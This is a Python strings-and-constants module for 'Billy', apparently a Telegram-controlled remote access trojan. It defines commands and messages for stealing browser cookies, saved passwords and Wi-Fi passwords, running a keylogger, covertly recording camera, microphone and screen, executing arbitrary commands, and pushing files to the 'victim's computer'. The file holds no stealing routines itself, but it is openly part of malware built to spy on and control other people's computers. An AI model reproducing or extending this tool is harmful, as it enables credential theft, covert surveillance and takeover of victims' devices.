Linux_OS = 'Linux'
Windows_OS = 'Windows'

installation_notification = "\U0001f3af Billy is active!"

timeout_error_message = "\U000023f0 The function took too long to execute and was terminated."
exception_error_message = '\U0000274c The function failed with an error: "{ERROR}"'

you_have_not_this_permission = '\U0001f6ab Sorry, but you haven\'t got this permission :('


ABOUT = 'about'
ABOUT_preview = '\U00002753About'
ABOUT_module = 'About'

ABOUT_GETVERSION = 'about/getversion'
ABOUT_GETVERSION_preview = 'Version'
ABOUT_GETVERSION_handler = 'About.getversion_callback'

ABOUT_AUTHOR = 'about/author'
ABOUT_AUTHOR_preview = 'Author'
ABOUT_AUTHOR_handler = 'About.author_callback'


ADMIN = 'admin'
ADMIN_preview = '\U0001f510 Admin'
ADMIN_module = 'Admin'

ADMIN_DELETE = 'admin/delete'
ADMIN_DELETE_preview = 'Delete Billy'
ADMIN_DELETE_command = 'delete'
ADMIN_DELETE_documentation = f'This option delete Billy. If you sure, that you want to delete him, <code>/{ADMIN_DELETE_command}</code>.'

ADMIN_UPDATE = 'admin/update'
ADMIN_UPDATE_preview = 'Update Billy'
ADMIN_UPDATE_command = 'update'
ADMIN_UPDATE_documentation = f'This option delete Billy. If you want to update him, <code>/{ADMIN_UPDATE_command}</code>.'

ADMIN_GETLOGS = 'admin/getlogs'
ADMIN_GETLOGS_preview = 'Get logs'
ADMIN_GETLOGS_command = 'getlogs'
ADMIN_GETLOGS_documentation = f"This function allows you to retrieve logs. Response format: Log table.\nCommand: <code>/{ADMIN_GETLOGS_command}</code>."

ADMIN_CLEARLOGS = 'admin/clearlogs'
ADMIN_CLEARLOGS_preview = 'Clear logs'
ADMIN_CLEARLOGS_handler = 'Admin.clearlogs_callback'

ADMIN_STOPBILLY = 'admin/stopBilly'
ADMIN_STOPBILLY_preview = 'Stop Billy'
ADMIN_STOPBILLY_command = 'stopBilly'
ADMIN_STOPBILLY_documentation = f'This function allows you to temporarily stop Billy (until the next system boot).\nCommand: <code>/{ADMIN_STOPBILLY_command}</code>.'

ADMIN_MANAGEPERMISSIONS = 'admin/managepermissions'
ADMIN_MANAGEPERMISSIONS_preview = 'Manage permissions'
ADMIN_MANAGEPERMISSIONS_handler = 'Admin.managepermissions_callback'
ADMIN_MANAGEPERMISSIONS_command = 'managepermissions'
ADMIN_MANAGEPERMISSIONS_documentation = f"This mode allows you to manage permissions. \nSyntax: <code>/{ADMIN_MANAGEPERMISSIONS_command} [telegram id]</code>\n"

SAVEPERMISSIONS = 'admin/savepermissions'
SAVEPERMISSIONS_preview = 'Save'
SAVEPERMISSIONS_handler = 'Admin.savepermissions_callback'
SAVEPERMISSIONS_permission = ADMIN_MANAGEPERMISSIONS

RESETPERMISSIONS = 'admin/resetpermissions'
RESETPERMISSIONS_preview = 'Reset'
RESETPERMISSIONS_handler = 'Admin.resetpermissions_callback'
RESETPERMISSIONS_permission = ADMIN_MANAGEPERMISSIONS

CANCELPERMISSIONS = 'admin/cancelpermissions'
CANCELPERMISSIONS_preview = 'Cancel'
CANCELPERMISSIONS_handler = 'Admin.cancelpermissions_callback'
CANCELPERMISSIONS_permission = ADMIN_MANAGEPERMISSIONS


BROWSER = 'browser'
BROWSER_preview = '\U0001f310 Browser'
BROWSER_module = 'Browser'

BROWSER_OPENURL = 'browser/openurl'
BROWSER_OPENURL_preview = "Open url"
BROWSER_OPENURL_command = 'openurl'
BROWSER_OPENURL_documentation = f'This mode allows you to ropen url in a browser. \nSyntax: <code>/{BROWSER_OPENURL_command} [url]</code>.'

BROWSER_STEALCOOKIE = 'browser/stealcookie'
BROWSER_STEALCOOKIE_preview = "Steal cookie"
BROWSER_STEALCOOKIE_handler = 'Browser.stealcookie_callback'

BROWSER_STEALPASSWORDS = 'browser/stealpasswords'
BROWSER_STEALPASSWORDS_preview = "Steal passwords"
BROWSER_STEALPASSWORDS_handler = 'Browser.stealpasswords_callback'


CAMERA = 'camera'
CAMERA_preview = '\U0001f4f8 Camera'
CAMERA_module = 'Camera'

CAMERA_SHOT = 'camera/shot'
CAMERA_SHOT_preview = 'Shot'
CAMERA_SHOT_handler = 'Camera.shot_callback'
CAMERA_SHOT_command = 'camerashot'
CAMERA_SHOT_documentation = f"This mode allows you to shot.\n{'{available_cameras}'} \nSyntax: <code>/{CAMERA_SHOT_command} [device]</code>."

CAMERA_VIDEO = 'camera/video'
CAMERA_VIDEO_preview = 'Video'
CAMERA_VIDEO_handler = 'Camera.video_callback'
CAMERA_VIDEO_command = 'cameravideo'
CAMERA_VIDEO_documentation = f"This mode allows you to record a video.\n{'{available_cameras}'} \nSyntax: <code>/{CAMERA_VIDEO_command} [device] [time]</code> (seconds, no more than {'{max_time_to_camera}'} seconds)."


COMMAND = 'command'
COMMAND_preview = '\U0001f4bb Command'
COMMAND_module = 'Command'

COMMAND_RUNCOMMAND = 'command/runcommand'
COMMAND_RUNCOMMAND_preview = 'Run command'
COMMAND_RUNCOMMAND_command = 'runcommand'
COMMAND_RUNCOMMAND_documentation = f"This mode allows you to run command. \nSyntax: <code>/{COMMAND_RUNCOMMAND_command} [command]</code>."


FILE = 'file'
FILE_preview = '\U0001f4c1 File'
FILE_module = 'File'

FILE_GETINF = 'file/getinf'
FILE_GETINF_preview = 'Get information'
FILE_GETINF_command = 'getinffile'
FILE_GETINF_documentation = f"This mode allows you to get information about file or directory. \nSyntax: <code>/{FILE_GETINF_command} [path]</code>."

FILE_CREATEFILE = 'file/createfile'
FILE_CREATEFILE_preview = 'Create file'
FILE_CREATEFILE_command = 'createfile'
FILE_CREATEFILE_handler = 'File.createfile_callback'
FILE_CREATEFILE_documentation = f"This mode allows you to create file. \nSyntax: <code>/{FILE_CREATEFILE_command} [path] {'{special_separator}'} [value]</code>."

FILE_CREATEDIR = 'file/createdir'
FILE_CREATEDIR_preview = 'Create directory'
FILE_CREATEDIR_command = 'createdir'
FILE_CREATEDIR_documentation = f"This mode allows you to create directory. \nSyntax: <code>/{FILE_CREATEDIR_command} [path]</code>."

FILE_COPY = 'file/copy'
FILE_COPY_preview = 'Copy file'
FILE_COPY_command = 'copyfile'
FILE_COPY_handler = 'File.copy_callback'
FILE_COPY_documentation = f"This mode allows you to copy file. \nSyntax: <code>/{FILE_COPY_command} [path1] {'{special_separator}'} [path2]</code>."

FILE_REMOVE = 'file/remove'
FILE_REMOVE_preview = 'Remove file or dir'
FILE_REMOVE_command = 'remove'
FILE_REMOVE_documentation = f"This mode allows you to remove file or directory. \nSyntax: <code>/{FILE_REMOVE_command} [path]</code>."

FILE_UPLOAD = 'file/upload'
FILE_UPLOAD_preview = 'Upload file'
FILE_UPLOAD_command = 'upload'
FILE_UPLOAD_handler = 'File.upload_callback'
FILE_UPLOAD_documentation = f"This mode allows you to upload file to network drive. \nSyntax: <code>/{FILE_UPLOAD_command} [file_path]</code>."

FILE_DOWNLOAD = 'file/download'
FILE_DOWNLOAD_preview = 'Download file'
FILE_DOWNLOAD_command = 'download'
FILE_DOWNLOAD_handler = 'File.download_callback'
FILE_DOWNLOAD_documentation = f"This mode allows you to download file to victim's computer. \nSyntax: <code>/{FILE_DOWNLOAD_command} [file_url] {'{special_separator}'} [file_path]</code>"


KEYBOARD = 'keyboard'
KEYBOARD_preview = '\U00002328 Keyboard'
KEYBOARD_module = 'Keyboard'

KEYBOARD_SPAM = 'keyboard/spam'
KEYBOARD_SPAM_preview = 'Spam'
KEYBOARD_SPAM_command = 'keyboardspam'
KEYBOARD_SPAM_handler = 'Keyboard.spam_callback'
KEYBOARD_SPAM_documentation = f"This mode allows you to randomly press keys for a certain amount of time. \nSyntax: <code>/{KEYBOARD_SPAM_command} [time]</code> (seconds, no more than {'{max_time_to_keyboard}'} seconds)."

KEYBOARD_SHORTCUT = 'keyboard/shortcut'
KEYBOARD_SHORTCUT_preview = 'Press shortcut'
KEYBOARD_SHORTCUT_command = 'keyboardshortcut'
KEYBOARD_SHORTCUT_documentation = f"This mode allows you to press a key or keyboard shortcut. \nSyntax: <code>/{KEYBOARD_SHORTCUT_command} key1+key2+key3</code>."

KEYBOARD_BLOCK = 'keyboard/block'
KEYBOARD_BLOCK_preview = 'Block'
KEYBOARD_BLOCK_command = 'keyboardblock'
KEYBOARD_BLOCK_handler = 'Keyboard.block_callback'
KEYBOARD_BLOCK_documentation = f"This mode allows you to block keyboard. \nSyntax: <code>/{KEYBOARD_BLOCK_command} [time]</code> (seconds, no more than {'{max_time_to_keyboard}'} seconds)."

KEYBOARD_PRINT = 'keyboard/print'
KEYBOARD_PRINT_preview = 'Print text'
KEYBOARD_PRINT_command = 'keyboardprint'
KEYBOARD_PRINT_documentation = f"This mode allows you to type text on the keyboard. \nSyntax: <code>/{KEYBOARD_PRINT_command} [text]</code>."

KEYLOGGER = 'keylogger'
KEYLOGGER_preview = '\U0001f511 Keylogger'
KEYLOGGER_handler = 'Keylogger.keylogger_callback'

KEYLOGGER_ON = 'keylogger/on'
KEYLOGGER_ON_preview = 'ON'
KEYLOGGER_ON_handler = 'Keylogger.on_callback'


KEYLOGGER_OFF = 'keylogger/off'
KEYLOGGER_OFF_preview = 'OFF'
KEYLOGGER_OFF_handler = 'Keylogger.off_callback'

KEYLOGGER_GET = 'keylogger/get'
KEYLOGGER_GET_preview = 'Get'
KEYLOGGER_GET_handler = 'Keylogger.get_callback'

KEYLOGGER_CLEAR = 'keylogger/clear'
KEYLOGGER_CLEAR_preview = 'Clear'
KEYLOGGER_CLEAR_handler = 'Keylogger.clearLog_callback'


MENU = 'menu'
MENU_preview = 'Menu'
MENU_command = 'start'
MENU_handler = 'Menu.menu_callback'


MICROPHONE = 'microphone'
MICROPHONE_preview = '\U0001f399 Microphone'
MICROPHONE_module = 'Microphone'

MICROPHONE_GETDEVICES = 'microphone/getdevices'
MICROPHONE_GETDEVICES_preview = 'Get devices'
MICROPHONE_GETDEVICES_handler = 'Microphone.getdevices_callback'

MICROPHONE_RECORD = 'microphone/record'
MICROPHONE_RECORD_preview = 'Record'
MICROPHONE_RECORD_handler = 'Microphone.record_callback'
MICROPHONE_RECORD_command = 'recordmicrophone'
MICROPHONE_RECORD_documentation = f"This mode allows you to record audio from microphone. \nSyntax: <code>/{MICROPHONE_RECORD_command} [device number] [time]</code> (seconds, no more than {'{max_time_to_record_microphone}'} seconds).\nDevices:\n"


MOUSE = 'mouse'
MOUSE_preview = '\U0001f5b1 Mouse'
MOUSE_module = 'Mouse'

MOUSE_MOVE = 'mouse/move'
MOUSE_MOVE_preview = 'Move'
MOUSE_MOVE_command = 'movemouse'
MOUSE_MOVE_documentation = f"This mode allows you to move a mouse. \nSyntax: <code>/{MOUSE_MOVE_command} [x] [y]</code>."

MOUSE_SCROLL = 'mouse/scroll'
MOUSE_SCROLL_preview = 'Scroll'
MOUSE_SCROLL_command = 'scrollmouse'
MOUSE_SCROLL_documentation = f"This mode allows you to move a mouse. \nSyntax: <code>/{MOUSE_SCROLL_command} [value]</code>."

MOUSE_LEFTCLICK = 'mouse/leftclick'
MOUSE_LEFTCLICK_preview = 'Left click'
MOUSE_LEFTCLICK_handler = 'Mouse.leftclick_callback'

MOUSE_RIGHTCLICK = 'mouse/rightclick'
MOUSE_RIGHTCLICK_preview = 'Right click'
MOUSE_RIGHTCLICK_handler = 'Mouse.rightclick_callback'

MOUSE_DOUBLECLICK = 'mouse/doubleclick'
MOUSE_DOUBLECLICK_preview = 'Double click'
MOUSE_DOUBLECLICK_handler = 'Mouse.doubleclick_callback'

MOUSE_PRESS = 'mouse/press'
MOUSE_PRESS_preview = 'Press'
MOUSE_PRESS_handler = 'Mouse.pressmouse_callback'

MOUSE_UNPRESS = 'mouse/unpress'
MOUSE_UNPRESS_preview = 'Unpress'
MOUSE_UNPRESS_handler = 'Mouse.unpressmouse_callback'

MOUSE_GETPOSITION = 'mouse/getposition'
MOUSE_GETPOSITION_preview = 'Get position'
MOUSE_GETPOSITION_handler = 'Mouse.getposition_callback'

MOUSE_BLOCK = 'mouse/block'
MOUSE_BLOCK_preview = 'Block'
MOUSE_BLOCK_command = 'blockmouse'
MOUSE_BLOCK_handler = 'Mouse.blockmouse_callback'
MOUSE_BLOCK_documentation = f"This mode allows you to block mouse. \nSyntax: <code>/{MOUSE_BLOCK_command} [time]</code> (seconds, no more than {'{max_time_to_mouse}'} seconds)."

MOUSE_SPAM = 'mouse/spam'
MOUSE_SPAM_preview = 'Spam'
MOUSE_SPAM_command = 'spammouse'
MOUSE_SPAM_handler = 'Mouse.spammouse_callback'
MOUSE_SPAM_documentation = f"This mode allows you to spam mouse. \nSyntax: <code>/{MOUSE_SPAM_command} [time]</code> (seconds, no more than {'{max_time_to_mouse}'} seconds)."


PHOTO = 'photo'
PHOTO_preview = '\U0001f5bc Photo'
PHOTO_module = 'Photo'

PHOTO_OPENPHOTO = 'photo/openphoto'
PHOTO_OPENPHOTO_preview = 'Open photo'
PHOTO_OPENPHOTO_command = 'openphoto'
PHOTO_OPENPHOTO_documentation = f"This mode allows you to open photo by link. \nSyntax: <code>/{PHOTO_OPENPHOTO_command} [link]</code>."

PHOTO_CHANGEWALLPAPERS = 'photo/changewallpapers'
PHOTO_CHANGEWALLPAPERS_preview = 'Change wallpapers'
PHOTO_CHANGEWALLPAPERS_command = 'changewallpapers'
PHOTO_CHANGEWALLPAPERS_handler = 'Photo.changewallpapers_callback'
PHOTO_CHANGEWALLPAPERS_documentation = f"This mode allows you to change wallpapers by link. \nSyntax: <code>/{PHOTO_CHANGEWALLPAPERS_command} [link]</code>."


RESTART = 'restart'
RESTART_preview = '\U00002757Restart system'
RESTART_handler = 'Restart.restart_callback'


SCREEN = 'screen'
SCREEN_preview = '\U0001f4fa Screen'
SCREEN_module = 'Screen'

SCREEN_GETSIZE = 'screen/getsize'
SCREEN_GETSIZE_preview = 'Get size'
SCREEN_GETSIZE_handler = 'Screen.getsize_callback'

SCREEN_SCREEN = 'screen/screen'
SCREEN_SCREEN_preview = 'Screen'
SCREEN_SCREEN_handler = 'Screen.screen_callback'


SYSTEM = 'system'
SYSTEM_preview = '\U00002699 System'
SYSTEM_module = 'System'

SYSTEM_GETIPMAC = 'system/getipmac'
SYSTEM_GETIPMAC_preview = 'Ip, MAC'
SYSTEM_GETIPMAC_handler = 'System.getipmac_callback'

SYSTEM_COLLECT_SYSTEM_INFO = 'system/collectsysteminfo'
SYSTEM_COLLECT_SYSTEM_INFO_preview = 'Collect system info'
SYSTEM_COLLECT_SYSTEM_INFO_handler = 'System.collectsysteminfo_callback'

SYSTEM_COLLECT_DISKS_INFO = 'system/collectdisksinfo'
SYSTEM_COLLECT_DISKS_INFO_preview = 'Collect disks info'
SYSTEM_COLLECT_DISKS_INFO_handler = 'System.collectdisksinfo_callback'

SYSTEM_GET_PROCESSES = 'system/getprocesses'
SYSTEM_GET_PROCESSES_preview = 'Get processes'
SYSTEM_GET_PROCESSES_handler = 'System.getprocesses_callback'


WIFI = 'WIFI'
WIFI_preview = '\U0001f6dc Wi-Fi'
WIFI_module = 'WIFI'

WIFI_STEALER = 'WIFI/stealer'
WIFI_STEALER_preview = 'WI-FI stealer'
WIFI_STEALER_handler = 'WIFI.stealer_callback'

WIFI_SHOWWIFI = 'WIFI/showwifi'
WIFI_SHOWWIFI_preview = 'Show available WI-FI'
WIFI_SHOWWIFI_handler = 'WIFI.showwifi_callback'


TEMP = 'temp'


MANAGEPERMISSION_prefix = 'managepermission'

INVALID_ARGUMENT = '\U0000274c Invalid argument.'

PROCESSING = 'Processing...'

TO_USE_MUST_BE_ROOT = '\U00002757To use this function, the program must be run with root.'


menu_greeting_message = "\U0001f5a5 What would you do?"

managepermissions_allow_message = 'Please press permissions you want to ALLOW:'
managepermissions_forbid_message = 'Please press permissions you want to FORBID:'
managepermissions_save_message = 'When you are done, save.'
managepermissions_iderror_message = "\U0000274c Error. Invalid changeable id."
savepermissions_saved_message = "\U00002705 Saved"
resetpermissions_reseted_message = "\U0000274c Reseted"
cancelpermissions_canceled_message = "\U0000274c Canceled"
managepermissions_id_message = """ID: <code>{id}</code>
- allowed:
{allowed}
- forbidden:
{forbidden}\n\n"""

keyboardblock_blocked_message = "\U0001f7e2 Keyboard blocked"
keyboardblock_unblocked_message = "\U0001f534 Keyboard unblocked."
keyboardspam_started_message = "\U0001f7e2 Keyboard spam started."
keyboardspam_finished_message = "\U0001f534 Keyboard spam finished."
keyboardprint_printed_message = "\U00002705 Text printed."

video_recording_started_message = "\U0001f7e2 Recording started."
video_recording_finished_message = "\U0001f534 Recording finished."

movemouse_moved_message = "\U00002705 Mouse moved."

scrollmouse_scrolled_message = "\U00002705 Mouse scrolled."

blockmouse_blocked_message = "\U0001f7e2 Mouse blocked."
blockmouse_unblocked_message = "\U0001f534 Mouse unblocked."

mousespam_started_message = "\U0001f7e2 Mouse spam started."
mousespam_finished_message = "\U0001f534 Mouse spam finished."
mouse_clicked_message = "\U00002705 Mouse clicked."
mousepress_pressed_message = '\U00002705 Mouse pressed.'
mouseunpress_unpressed_message = '\U00002705 Mouse unpressed.'

recordmicrophone_recording_started_message = "\U0001f7e2 Recording started"
recordmicrophone_recording_finished_message = "\U0001f534 Recording finished"
microphonegetdevices_devices_message = 'Devices:\n'

openurl_opened_message = "\U00002705 Url opened."

clearlogs_cleared_message = "\U00002705 Cleared."

stopbilly_stopped_message = "\U00002705 Stopped. Billy will be start in the next system login."

keylogger_statuschanged_message = '\U00002705 Status changed -> {status}.'
keylogger_cleared_message = '\U00002705 Cleared.'

wifistealer_answer_message = 'NAME                              PASSWORD\n'
seems_like_you_havent_wlan = "\U00002757Seems like device haven't wlan."

temp_message = "\U0000274c Sorry, but this function isn't supported."

command_not_found = "\U0000274c Command not found: "

file_or_dir_is_not_exist = "File or dir is not exist."
file_size_is_too_large = "\U0000274c The file size exceeds the {size_limit} MB limit."
file_is_not_attached = "\U0000274c The file is not attached."
file_or_directory_is_protected = "\U0000274c The file or directory is not allowed to be modified."
invalid_file_path = "\U0000274c Invalid file path."
invalid_file = "\U0000274c Invalid file."
downloading_file = "Downloading file..."
file_downloaded = """\U00002705 The file was saved successfully!\n\U0001f4c1 Path: <code>{save_path}</code>\n\U0001f4ca Size: {file_size:.2f} KB"""
file_information_message = '\U0001f4ca Size: <code>{file_size}</code> bytes\n\U0001f550 Date of change: <code>{file_mtime}</code>.'
file_removed_message = "\U00002705 File <code>{file_path}</code> removed."
directory_removed_message = "\U00002705 Directory <code>{dir_path}</code> removed."
file_created_message = "\U00002705 File <code>{file_path}</code> created."
file_copied_message = "\U00002705 File copied from <code>{file_path1}</code> to <code>{file_path1}</code>."
directory_created_message = "\U00002705 Directory <code>{dir_path}</code> created"
file_or_directory_is_protected = "\U0000274c File or directory isn't allowed to changable."
downloading_starting_message = "\U000023ec Downloading started...\nURL: <code>{url}</code>..."
downloading_progress_message = "\U000023ec Downloading... {progress:.1f}%\n\U0001f4ca {downloaded}KB / {total_size}KB"
file_saved_message = "\U00002705 File is saved!\n\U0001f4c1 Path: <code>{save_path}</code>\n\U0001f4ca Size: <code>{file_size:.2f} KB</code>"
downloading_error_mesage = "\U0000274c Downloading error: HTTP {status}."

system_restarted_message = f'\U00002705 System restarted.'

system_getIpMac_message = 'White ip: <code>{white_ip}</code>\nGray ip: <code>{gray_ip}</code>\nMAC: <code>{MAC}</code>'
system_collect_system_info_message = \
    """System Information:
Operating System: <code>{os}</code>
OS Version: <code>{os_version}</code>
OS Release: <code>{os_release}</code>
Architecture: <code>{architecture}</code>
Processor: <code>{processor}</code>
Hostname: <code>{hostname}</code>
Username: <code>{username}</code>

Memory Information:
Total: <code>{total_gb} GB</code>
Available: <code>{available_gb} GB</code>
Usage: <code>{used_percent}%</code>

CPU Information:
Cores: <code>{cores}</code>
Logical Cores: <code>{logical_cores}</code>
Current Usage: <code>{usage_percent}%</code>
Frequency: <code>{frequency} MHz</code>
"""
system_collect_disks_info_message = \
    """Disk info:
Device: <code>{device}</code>
Mountpoint: <code>{mountpoint}</code>
Fstype: <code>{fstype}</code>
Total gb: <code>{total_gb}</code>
Used gb: <code>{used_gb}</code>
Free gb: <code>{free_gb}</code>\n\n"""
system_getprocesses_message = "Processes:\nName             Username         PID"

author_message = "Created by Serabobina."

camera_devices_message = 'Camera devices:\n'
you_havent_any_cameras = '\U00002757Seems like this device doesn\'t have any cameras.'

Billy_deleted_windows_message = "\U0001fae1 Billy will be removed on the next system startup, but you can restart system."
Billy_deleted_linux_message = "\U0001fae1 Billy is be removed."

keylogger_status_message = '\n\nStatus: {status}'

image_opened_message = "\U00002705 Image opened."
wallpaper_changed_message = "\U00002705 Wallpaper changed."
